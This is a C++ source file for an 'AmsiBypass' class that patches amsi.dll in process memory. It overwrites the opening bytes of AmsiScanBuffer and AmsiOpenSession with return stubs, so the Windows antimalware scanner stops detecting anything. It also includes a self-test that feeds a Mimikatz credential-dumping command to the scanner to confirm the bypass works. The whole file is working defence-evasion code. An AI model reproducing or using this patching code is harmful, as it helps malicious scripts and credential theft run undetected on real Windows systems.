#include "AmsiBypass.h"
#include <stdio.h>
#include <amsi.h>

#pragma comment(lib, "amsi.lib")

AmsiBypass::AmsiBypass() {
    m_scanBufferPatch.address = nullptr;
    m_scanBufferPatch.isPatched = false;
    m_openSessionPatch.address = nullptr;
    m_openSessionPatch.isPatched = false;
}

AmsiBypass::~AmsiBypass() {
    RestoreAmsi();
}

void* AmsiBypass::GetAmsiScanBufferAddress() {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi) {
        return nullptr;
    }
    
    return (void*)GetProcAddress(hAmsi, "AmsiScanBuffer");
}

void* AmsiBypass::GetAmsiOpenSessionAddress() {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi) {
        return nullptr;
    }
    
    return (void*)GetProcAddress(hAmsi, "AmsiOpenSession");
}

bool AmsiBypass::ChangeProtection(void* address, size_t size, DWORD newProtect, DWORD* oldProtect) {
    return VirtualProtect(address, size, newProtect, oldProtect) != 0;
}

bool AmsiBypass::PatchMemory(void* address, const BYTE* patch, size_t size, PatchInfo& info) {
    if (!address || !patch || size == 0) {
        return false;
    }
    
    // Save original bytes
    info.address = address;
    info.originalBytes.resize(size);
    memcpy(info.originalBytes.data(), address, size);
    
    // Change protection
    DWORD oldProtect;
    if (!ChangeProtection(address, size, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        return false;
    }
    
    // Apply patch
    memcpy(address, patch, size);
    
    // Restore protection
    ChangeProtection(address, size, oldProtect, &oldProtect);
    
    // Flush instruction cache
    FlushInstructionCache(GetCurrentProcess(), address, size);
    
    info.isPatched = true;
    return true;
}

bool AmsiBypass::RestorePatch(PatchInfo& info) {
    if (!info.isPatched || !info.address) {
        return false;
    }
    
    DWORD oldProtect;
    if (!ChangeProtection(info.address, info.originalBytes.size(), PAGE_EXECUTE_READWRITE, &oldProtect)) {
        return false;
    }
    
    memcpy(info.address, info.originalBytes.data(), info.originalBytes.size());
    
    ChangeProtection(info.address, info.originalBytes.size(), oldProtect, &oldProtect);
    FlushInstructionCache(GetCurrentProcess(), info.address, info.originalBytes.size());
    
    info.isPatched = false;
    return true;
}

bool AmsiBypass::BypassAmsiScanBufferAlternative() {
    void* pAmsiScanBuffer = GetAmsiScanBufferAddress();
    if (!pAmsiScanBuffer) {
        printf("[-] AmsiScanBuffer not found\n");
        return false;
    }
    
    printf("[*] Trying alternative patch method\n");
    printf("[*] AmsiScanBuffer: 0x%p\n", pAmsiScanBuffer);
    
    // Alternative patch: xor rax, rax; ret (x64)
    // This returns 0 (success) but doesn't actually scan
    BYTE patch[] = {
        0x48, 0x31, 0xC0,  // xor rax, rax
        0xC3               // ret
    };
    
    if (PatchMemory(pAmsiScanBuffer, patch, sizeof(patch), m_scanBufferPatch)) {
        printf("[+] AmsiScanBuffer patched (alternative method)\n");
        return true;
    }
    
    printf("[-] Alternative patch failed\n");
    return false;
}

bool AmsiBypass::BypassAmsiScanBuffer() {
    void* pAmsiScanBuffer = GetAmsiScanBufferAddress();
    if (!pAmsiScanBuffer) {
        printf("[-] AmsiScanBuffer not found\n");
        return false;
    }
    
    printf("[*] AmsiScanBuffer: 0x%p\n", pAmsiScanBuffer);
    
    // Read first bytes to show original
    BYTE original[10];
    memcpy(original, pAmsiScanBuffer, 10);
    printf("[*] Original bytes: ");
    for (int i = 0; i < 10; i++) {
        printf("%02X ", original[i]);
    }
    printf("\n");
    
    // Patch for x64: mov eax, 0x80070057; ret
    BYTE patch[] = {
        0xB8, 0x57, 0x00, 0x07, 0x80,  // mov eax, 0x80070057 (E_INVALIDARG)
        0xC3                            // ret
    };
    
    if (PatchMemory(pAmsiScanBuffer, patch, sizeof(patch), m_scanBufferPatch)) {
        printf("[+] AmsiScanBuffer patched\n");
        
        // Verify patch
        BYTE verify[6];
        memcpy(verify, pAmsiScanBuffer, 6);
        printf("[*] Patched bytes: ");
        for (int i = 0; i < 6; i++) {
            printf("%02X ", verify[i]);
        }
        printf("\n");
        
        return true;
    }
    
    printf("[-] Failed to patch AmsiScanBuffer\n");
    return false;
}

bool AmsiBypass::BypassAmsiOpenSession() {
    void* pAmsiOpenSession = GetAmsiOpenSessionAddress();
    if (!pAmsiOpenSession) {
        printf("[-] AmsiOpenSession not found\n");
        return false;
    }
    
    printf("[*] AmsiOpenSession: 0x%p\n", pAmsiOpenSession);
    
    // Patch: xor eax, eax; ret
    // This makes AMSI session creation fail gracefully
    BYTE patch[] = {
        0x33, 0xC0,  // xor eax, eax
        0xC3         // ret
    };
    
    if (PatchMemory(pAmsiOpenSession, patch, sizeof(patch), m_openSessionPatch)) {
        printf("[+] AmsiOpenSession patched\n");
        return true;
    }
    
    printf("[-] Failed to patch AmsiOpenSession\n");
    return false;
}

bool AmsiBypass::BypassAll() {
    printf("[*] Patching AMSI functions\n\n");
    
    bool success = false;
    
    // Try primary method first
    if (BypassAmsiScanBuffer()) {
        success = true;
    } else {
        // Try alternative method
        printf("\n[*] Primary method failed, trying alternative\n");
        if (BypassAmsiScanBufferAlternative()) {
            success = true;
        }
    }
    
    // Patch AmsiOpenSession
    if (BypassAmsiOpenSession()) {
        success = true;
    }
    
    printf("\n");
    
    if (success) {
        printf("[+] AMSI bypassed successfully\n");
    } else {
        printf("[-] AMSI bypass failed\n");
    }
    
    return success;
}

bool AmsiBypass::IsAmsiBypassed() {
    return m_scanBufferPatch.isPatched || m_openSessionPatch.isPatched;
}

bool AmsiBypass::TestBypass() {
    printf("[*] Testing AMSI bypass\n");
    
    // Load amsi.dll
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi) {
        printf("[-] Failed to load amsi.dll\n");
        return false;
    }
    
    printf("[*] amsi.dll: 0x%p\n", hAmsi);
    
    // Get AmsiScanBuffer
    typedef HRESULT(WINAPI* AmsiScanBuffer_t)(
        HAMSICONTEXT amsiContext,
        PVOID buffer,
        ULONG length,
        LPCWSTR contentName,
        HAMSISESSION amsiSession,
        AMSI_RESULT* result
    );
    
    AmsiScanBuffer_t pAmsiScanBuffer = (AmsiScanBuffer_t)GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!pAmsiScanBuffer) {
        printf("[-] Failed to get AmsiScanBuffer\n");
        return false;
    }
    
    printf("[*] Testing with malicious string\n");
    
    // Test with known AMSI signature
    const char* testString = "Invoke-Mimikatz -Command \"privilege::debug sekurlsa::logonpasswords\"";
    AMSI_RESULT result = AMSI_RESULT_CLEAN;
    
    HRESULT hr = pAmsiScanBuffer(
        nullptr,
        (PVOID)testString,
        (ULONG)strlen(testString),
        L"test.ps1",
        nullptr,
        &result
    );
    
    printf("[*] HRESULT: 0x%08X\n", hr);
    printf("[*] Result: %d\n", result);
    
    // If bypassed, should return E_INVALIDARG (0x80070057)
    if (hr == 0x80070057) {
        printf("[+] Bypass verified (E_INVALIDARG)\n");
        return true;
    } else if (SUCCEEDED(hr) && result == AMSI_RESULT_CLEAN) {
        printf("[+] Bypass verified (Clean result)\n");
        return true;
    } else if (SUCCEEDED(hr) && result != AMSI_RESULT_CLEAN) {
        printf("[-] Bypass FAILED - AMSI detected malicious content (Result: %d)\n", result);
        return false;
    } else {
        printf("[-] Verification inconclusive (HRESULT: 0x%X)\n", hr);
        return false;
    }
}

bool AmsiBypass::RestoreAmsi() {
    printf("[*] Restoring AMSI\n");
    
    bool success = true;
    
    if (m_scanBufferPatch.isPatched) {
        if (RestorePatch(m_scanBufferPatch)) {
            printf("[+] AmsiScanBuffer restored\n");
        } else {
            printf("[-] Failed to restore AmsiScanBuffer\n");
            success = false;
        }
    }
    
    if (m_openSessionPatch.isPatched) {
        if (RestorePatch(m_openSessionPatch)) {
            printf("[+] AmsiOpenSession restored\n");
        } else {
            printf("[-] Failed to restore AmsiOpenSession\n");
            success = false;
        }
    }
    
    return success;
}
